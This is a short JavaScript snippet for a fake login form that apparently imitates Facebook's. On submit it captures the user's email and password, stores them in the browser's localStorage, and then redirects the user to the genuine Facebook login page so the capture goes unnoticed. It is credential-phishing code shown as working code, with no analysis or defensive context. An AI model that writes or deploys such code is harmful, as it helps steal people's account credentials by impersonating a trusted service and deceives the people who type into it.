document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way

    // Get the values from the form
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    // Store the values in localStorage
    localStorage.setItem('email', email);
    localStorage.setItem('password', password);

    // Redirect to the actual Facebook login page
    window.location.href = 'https://www.facebook.com/login/';
});
